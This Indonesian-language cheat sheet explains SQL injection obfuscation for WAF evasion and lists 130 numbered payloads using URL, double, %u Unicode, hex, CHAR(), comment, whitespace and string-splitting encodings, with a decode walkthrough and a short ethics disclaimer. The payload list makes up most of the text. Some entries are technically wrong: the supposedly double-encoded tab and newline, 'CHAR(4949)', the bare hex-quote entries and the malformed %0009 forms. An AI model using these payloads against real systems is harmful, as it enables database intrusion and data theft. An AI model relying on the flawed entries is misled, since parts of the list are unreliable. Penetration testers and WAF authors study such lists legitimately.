# SQL Injection Obfuscation Payload (Unicode & Encoding)

---

## 1. Apa Itu Obfuscation Payload (Unicode / Encoding)?

### 1.1 Definisi

**Obfuscation payload** adalah teknik menyamarkan payload SQL Injection agar:

* Tidak terdeteksi oleh Web Application Firewall (WAF)
* Tidak cocok dengan regex/filter statis
* Tetap valid secara sintaks SQL saat dieksekusi oleh database

Alih-alih menulis:

```
' OR 1=1 --
```

Penyerang/pentester akan mengubah bentuknya menjadi:

```
%27%20OR%201%3D1%20--
```

atau:

```
%u0027/**/OR/**/1=1--+
```

Secara logika SQL tetap sama, tetapi **signature-based detection gagal mengenali pola**.

---

### 1.2 Mengapa Unicode & Encoding Efektif?

WAF biasanya melakukan:

1. Pattern matching
2. Regex detection
3. Keyword scanning (SELECT, UNION, OR, AND, etc)

Namun banyak WAF:

* Tidak melakukan **normalisasi Unicode penuh**
* Tidak melakukan **double decoding**
* Tidak menyamakan semua representasi karakter

Akibatnya payload yang terlihat berbeda bisa lolos filter, namun tetap diparse valid oleh DBMS.

---

### 1.3 Proses Teknis di Backend

Alur request:

```
Client → WAF → Web Server → Framework → DB Driver → Database
```

Jika WAF hanya decode sekali, tetapi server decode dua kali:

```
%2527 → %27 → '
```

WAF melihat `%27`, server melihat `'`.

Ini disebut **double decoding attack surface**.

---

### 1.4 Jenis Encoding yang Digunakan

| Teknik                 | Contoh       | Keterangan             |
| ---------------------- | ------------ | ---------------------- |
| URL Encoding           | `%27`        | ASCII percent-encoding |
| Double Encoding        | `%2527`      | Encoded twice          |
| Unicode Encoding       | `%u0027`     | UTF-16 encoding        |
| Hex Encoding           | `0x27`       | Hex literal            |
| CHAR() Encoding        | `CHAR(39)`   | SQL char constructor   |
| Mixed Encoding         | `%27%u0020`  | Kombinasi              |
| Whitespace Obfuscation | `%0a`, `%09` | Newline, tab           |
| Comment Injection      | `/**/`       | SQL inline comment     |
| Case Mutation          | `SeLeCt`     | Bypass regex           |
| String Splitting       | `'UNI'+'ON'` | Concatenation          |

---

### 1.5 Tujuan Obfuscation Payload

* Menghindari WAF signature detection
* Menghindari keyword blacklist
* Menghindari character blacklist
* Menghindari heuristic scoring
* Mem-bypass naive sanitization

---

### 1.6 Legal & Etika

Teknik ini hanya boleh digunakan untuk:

* Lab pentesting
* Bug bounty scope legal
* Audit keamanan internal

Penggunaan ilegal melanggar hukum.

---

## 2. Notasi & Asumsi Payload

Semua payload diasumsikan dimasukkan ke parameter rentan:

```
?id=PAYLOAD
```

Target DBMS: umum (MySQL, PostgreSQL, MSSQL, Oracle).
Jika spesifik DBMS, akan dijelaskan.

---

# 3. 120+ SQL Injection Obfuscation Payload

Payload dibagi ke dalam **kategori teknik** agar mudah dipahami.

---

## A. URL Encoding (Basic Percent Encoding)

### Konsep

Mengubah karakter ASCII menjadi `%HEX`.

| Karakter | Encoding |
| -------- | -------- |
| `'`      | `%27`    |
| `"`      | `%22`    |
| Space    | `%20`    |
| `=`      | `%3D`    |
| `-`      | `%2D`    |

---

### Payload 1–10

1.

```
%27%20OR%201%3D1--+
```

Penjelasan:

* `%27` = `'`
* `%20` = space
* `%3D` = `=`
  Payload decode → `' OR 1=1--+`

---

2.

```
%22%20OR%201%3D1--+
```

Decode → `" OR 1=1--+`

---

3.

```
%27%20OR%20%271%27%3D%271--+
```

Decode → `' OR '1'='1--+`

---

4.

```
%27%20OR%20TRUE--+
```

Decode → `' OR TRUE--+`

---

5.

```
%27%20OR%201%3D1%23
```

Decode → `' OR 1=1#`

---

6.

```
%27%20OR%201%3D1%2F%2F
```

Decode → `' OR 1=1//`

---

7.

```
%27%09OR%091%3D1--+
```

`%09` = tab, mengganti spasi.

---

8.

```
%27%0AOR%0A1%3D1--+
```

`%0A` = newline.

---

9.

```
%27%20OR%201%3D1%00
```

`%00` = null byte, kadang memotong query.

---

10.

```
%27%20OR%20%31%3D%31--+
```

`%31` = ASCII `1`.

---

## B. Double URL Encoding

### Konsep

Encoding dua kali:

```
' → %27 → %2527
```

Jika backend decode dua kali dan WAF sekali, payload lolos.

---

### Payload 11–20

11.

```
%2527%2520OR%25201%253D1--+
```

Decode 1 → `%27 OR 1=1--+`
Decode 2 → `' OR 1=1--+`

---

12.

```
%2527%2520OR%2520%25271%2527%253D%25271--+
```

Decode → `' OR '1'='1--+`

---

13.

```
%2522%2520OR%25201%253D1--+
```

Decode → `" OR 1=1--+`

---

14.

```
%2527%2520OR%2520TRUE--+
```

Decode → `' OR TRUE--+`

---

15.

```
%2527%2520OR%25201%253D1%2523
```

Decode → `' OR 1=1#`

---

16.

```
%2527%25209OR%252091%253D1--+
```

Double encoded tab.

---

17.

```
%2527%25200AOR%25200A1%253D1--+
```

Double encoded newline.

---

18.

```
%2527%2520OR%25201%253D1%2500
```

Double encoded null byte.

---

19.

```
%2527%2520OR%2520%2531%253D%2531--+
```

Encoded digit.

---

20.

```
%2527%2520OR%2520%252531%253D%252531--+
```

Nested encoding on digit `1`.

---

## C. Unicode Encoding (%uXXXX)

### Konsep

Menggunakan UTF-16 encoding:

```
' → %u0027
Space → %u0020
```

Banyak WAF lama tidak normalize `%uXXXX`.

---

### Payload 21–30

21.

```
%u0027%u0020OR%u00201=1--+
```

Decode → `' OR 1=1--+`

---

22.

```
%u0027%u0020OR%u0020%u00271%u0027=%u00271--+
```

Decode → `' OR '1'='1--+`

---

23.

```
%u0022%u0020OR%u00201=1--+
```

Decode → `" OR 1=1--+`

---

24.

```
%u0027%u0020OR%u0020TRUE--+
```

---

25.

```
%u0027%u0020OR%u00201=1%u0023
```

---

26.

```
%u0027%u0009OR%u00091=1--+
```

Unicode tab.

---

27.

```
%u0027%u000AOR%u000A1=1--+
```

Unicode newline.

---

28.

```
%u0027%u0020OR%u00201=1%u0000
```

Unicode null byte.

---

29.

```
%u0027%u0020OR%u0031=%u0031--+
```

Unicode digit.

---

30.

```
%u0027/**/OR/**/1=1--+
```

Unicode + comment splitting.

---

## D. Mixed Encoding (Unicode + URL + Hex)

### Konsep

Menggabungkan beberapa encoding sekaligus agar WAF sulit melakukan canonicalization.

---

### Payload 31–45

31.

```
%u0027%20OR%201=1--+
```

32.

```
%27%u0020OR%20%31=%u0031--+
```

33.

```
%u0027%09OR%u00201=1--+
```

34.

```
%2527%u0020OR%25201=1--+
```

35.

```
%27%20OR%20CHAR(49)%3DCHAR(49)--+
```

36.

```
%27%20OR%20HEX(31)%3DHEX(31)--+
```

37.

```
%27%20OR%20ASCII(49)%3DASCII(49)--+
```

38.

```
%27%20OR%20%u0031%3D%31--+
```

39.

```
%u0027%20OR%20%u0031=%u0031--+
```

40.

```
%27%u0020OR%20%31=%31--+
```

41.

```
%27%20OR%20%u0031%3D%u0031--+
```

42.

```
%2527%20OR%20%u0031=1--+
```

43.

```
%u0027%2520OR%25201=1--+
```

44.

```
%27%20OR%20%30x31=%30x31--+
```

Hex literal disguised.

---

45.

```
%27%20OR%20CHAR(0x31)%3DCHAR(0x31)--+
```

---

## E. Hexadecimal Encoding (SQL-Level)

### Konsep

Menggunakan representasi hex di SQL:

```
' → 0x27
1 → 0x31
```

---

### Payload 46–60

46.

```
0x27 OR 1=1--
```

47.

```
0x27 OR 0x31=0x31--
```

48.

```
0x27 OR TRUE--
```

49.

```
0x27 OR 1 LIKE 1--
```

50.

```
0x27 OR ASCII(0x31)=ASCII(0x31)--+
```

51.

```
0x27 OR HEX(31)=HEX(31)--+
```

52.

```
0x27 OR 0x31 BETWEEN 0x31 AND 0x31--+
```

53.

```
0x27 OR LENGTH(0x31)=1--+
```

54.

```
0x27 OR SUBSTRING(0x31,1,1)=0x31--+
```

55.

```
0x27 OR CONV(31,10,10)=31--+
```

56.

```
0x27 OR 49=0x31--+
```

57.

```
0x27 OR CHAR(0x31)=CHAR(0x31)--+
```

58.

```
0x27 OR UNHEX(31)=UNHEX(31)--+
```

59.

```
0x27 OR 0x31 REGEXP 0x31--+
```

60.

```
0x27 OR COALESCE(0x31,0x31)=0x31--+
```

---

## F. CHAR() Encoding

### Konsep

Menggunakan fungsi CHAR() untuk membuat string tanpa tanda kutip literal.

```
CHAR(39) = '
CHAR(49) = 1
```

---

### Payload 61–75

61.

```
CHAR(39) OR 1=1--
```

62.

```
CHAR(39) OR CHAR(49)=CHAR(49)--+
```

63.

```
CHAR(39) OR TRUE--+
```

64.

```
CHAR(39)||OR||1=1--
```

65.

```
CHAR(39) OR ASCII(49)=49--+
```

66.

```
CHAR(39) OR LENGTH(CHAR(49))=1--+
```

67.

```
CHAR(39) OR SUBSTR(CHAR(49),1,1)=CHAR(49)--+
```

68.

```
CHAR(39) OR CHAR(49) LIKE CHAR(49)--+
```

69.

```
CHAR(39) OR COALESCE(CHAR(49),CHAR(49))=CHAR(49)--+
```

70.

```
CHAR(39) OR CHAR(49)||CHAR(49)=CHAR(4949)--+
```

71.

```
CHAR(39) OR CONCAT(CHAR(49),CHAR(49))=CHAR(4949)--+
```

72.

```
CHAR(39) OR REPEAT(CHAR(49),1)=CHAR(49)--+
```

73.

```
CHAR(39) OR POSITION(CHAR(49) IN CHAR(49))=1--+
```

74.

```
CHAR(39) OR INSTR(CHAR(49),CHAR(49))=1--+
```

75.

```
CHAR(39) OR LPAD(CHAR(49),1,CHAR(49))=CHAR(49)--+
```

---

## G. Comment Injection + Encoding

### Konsep

Mengganti spasi dengan komentar:

```
SELECT/**/1
```

---

### Payload 76–90

76.

```
%27/**/OR/**/1=1--+
```

77.

```
%u0027/**/OR/**/%31=%31--+
```

78.

```
%27/*test*/OR/*test*/1=1--+
```

79.

```
%27/*!50000OR*/1=1--+
```

80.

```
%27/**/OR/**/TRUE--+
```

81.

```
%27/**/OR/**/%u0031=%u0031--+
```

82.

```
%27/*random*/OR/*random*/%31=%31--+
```

83.

```
%27/*!OR*/1=1--+
```

84.

```
%27/**/OR/**/CHAR(49)=CHAR(49)--+
```

85.

```
%27/*x*/OR/*y*/ASCII(49)=49--+
```

86.

```
%27/**/OR/**/HEX(31)=HEX(31)--+
```

87.

```
%27/**/OR/**/LENGTH(1)=1--+
```

88.

```
%27/**/OR/**/POSITION(1 IN 1)=1--+
```

89.

```
%27/**/OR/**/COALESCE(1,1)=1--+
```

90.

```
%27/**/OR/**/1 LIKE 1--+
```

---

## H. Whitespace Encoding (Tab, Newline, CRLF)

### Konsep

Mengganti spasi dengan karakter whitespace lain.

---

### Payload 91–100

91.

```
%27%09OR%091=1--+
```

92.

```
%27%0AOR%0A1=1--+
```

93.

```
%27%0D%0AOR%0D%0A1=1--+
```

94.

```
%27%0COR%0C1=1--+
```

95.

```
%27%0BOR%0B1=1--+
```

96.

```
%u0027%0009OR%00091=1--+
```

97.

```
%u0027%000AOR%000A1=1--+
```

98.

```
%27%20%20OR%20%201=1--+
```

99.

```
%27%09/**/%09OR%09/**/%091=1--+
```

100.

```
%27%0A/**/%0AOR%0A/**/%0A1=1--+
```

---

## I. String Splitting + Encoding

### Konsep

Memecah keyword:

```
UNION → 'UNI'+'ON'
OR → 'O'+'R'
```

---

### Payload 101–110

101.

```
%27%20%27O%27%2B%27R%27%201=1--+
```

Decode → `' 'O'+'R' 1=1--+`

---

102.

```
%27%20CHAR(79)%2BCHAR(82)%201=1--+
```

103.

```
%27%20CONCAT(CHAR(79),CHAR(82))%201=1--+
```

104.

```
%27%20%27O%27||%27R%27%201=1--+
```

105.

```
%27%20LOWER('OR')%201=1--+
```

106.

```
%27%20UPPER('or')%201=1--+
```

107.

```
%27%20REPLACE('OX','X','R')%201=1--+
```

108.

```
%27%20CHR(79)||CHR(82)%201=1--+
```

109.

```
%27%20ASCII(79)||ASCII(82)%201=1--+
```

110.

```
%27%20SUBSTRING('OR',1,2)%201=1--+
```

---

## J. Advanced Unicode + Multi-Layer Encoding

### Konsep

Menggabungkan:

* Unicode
* Double encoding
* Comments
* CHAR()

---

### Payload 111–130

111.

```
%2527/**/%u0020OR/**/%25201=1--+
```

112.

```
%u0027/**/%2520OR/**/%25201=1--+
```

113.

```
%2527%u0020OR%2520%u0031=%u0031--+
```

114.

```
%2527/**/%u0020OR/**/%u0031=%u0031--+
```

115.

```
%u0027/**/%2520OR/**/%u0031=%252031--+
```

116.

```
%2527/**/%u0020OR/**/CHAR(49)=CHAR(49)--+
```

117.

```
%2527%u0020OR%2520HEX(31)=HEX(31)--+
```

118.

```
%u0027/**/%2520OR/**/ASCII(49)=49--+
```

119.

```
%2527/**/%u0020OR/**/LENGTH(1)=1--+
```

120.

```
%2527/**/%u0020OR/**/COALESCE(1,1)=1--+
```

121.

```
%2527%u0020OR%2520SUBSTRING(1,1,1)=1--+
```

122.

```
%2527/**/%u0020OR/**/1 LIKE 1--+
```

123.

```
%u0027/**/%2520OR/**/%25201 LIKE %25201--+
```

124.

```
%2527/**/%u0020OR/**/CHAR(49)||CHAR(49)=CHAR(4949)--+
```

125.

```
%2527/**/%u0020OR/**/REPEAT(CHAR(49),1)=CHAR(49)--+
```

126.

```
%2527/**/%u0020OR/**/POSITION(1 IN 1)=1--+
```

127.

```
%2527/**/%u0020OR/**/INSTR(1,1)=1--+
```

128.

```
%2527/**/%u0020OR/**/LPAD(1,1,1)=1--+
```

129.

```
%2527/**/%u0020OR/**/CONCAT(1,1)=11--+
```

130.

```
%2527/**/%u0020OR/**/CAST(1 AS CHAR)=1--+
```

---

# 4. Contoh Decode Step-by-Step

Payload:

```
%2527/**/%u0020OR/**/%25201=1--+
```

Step 1 decode:

```
%27/**/%u0020OR/**/%201=1--+
```

Step 2 decode:

```
'/**/ OR /**/ 1=1--+
```

SQL yang dieksekusi DB:

```
' OR 1=1--+
```

---

# 5. Mengapa WAF Bisa Kalah?

| Penyebab                      | Penjelasan                |
| ----------------------------- | ------------------------- |
| Tidak normalize Unicode       | `%u0027` tidak dikonversi |
| Decode hanya sekali           | `%2527` lolos             |
| Regex terlalu statis          | Tidak mengenali `O/**/R`  |
| Parser mismatch               | WAF ≠ backend SQL parser  |
| Tidak inspeksi nested payload | JSON/multipart lolos      |

---

# 6. Perbedaan Filtering vs Parsing

WAF:

```
Regex → block jika ada " OR 1=1"
```

Backend SQL:

```
Parser → decode → normalize → execute
```

Jika proses berbeda, maka obfuscation bekerja.

---

# 7. Ringkasan Teknik Utama

| Teknik            | Tujuan                        |
| ----------------- | ----------------------------- |
| URL Encoding      | Bypass keyword filter         |
| Double Encoding   | Bypass decode-once WAF        |
| Unicode Encoding  | Bypass ASCII-only regex       |
| CHAR() Encoding   | Bypass quote filter           |
| Comment Injection | Bypass whitespace detection   |
| Mixed Encoding    | Bypass normalization pipeline |

---

# 8. Penutup

Obfuscation payload (Unicode/encoding) adalah **teknik inti dalam modern SQL injection evasion**, bukan eksploitasi brute-force, tetapi:

* Mengakali parsing layer
* Mengacaukan canonicalization
* Menyerang perbedaan interpretasi antara WAF dan backend

Ini adalah teknik tingkat lanjut yang digunakan dalam:

* Red teaming
* Bug bounty
* Security research
* WAF testing
* Defense hardening
